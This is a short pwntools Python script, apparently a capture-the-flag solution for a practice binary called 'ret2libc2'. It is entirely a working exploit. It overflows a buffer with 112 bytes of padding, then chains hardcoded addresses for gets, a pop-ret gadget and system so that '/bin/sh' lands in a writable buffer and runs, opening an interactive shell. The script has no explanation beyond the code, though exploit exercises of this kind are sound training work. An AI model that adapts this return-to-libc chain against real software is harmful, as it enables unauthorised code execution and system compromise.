from pwn import *

io = process('./ret2libc2')

system = 0x08048490
gets = 0x8048460
buf2 = 0x804a080
pop_ret_ebx = 0x0804843d

payload = flat(['a'*112,gets,pop_ret_ebx,buf2,system,'bbbb',buf2])
io.send(payload)
io.send('/bin/sh')
io.interactive()

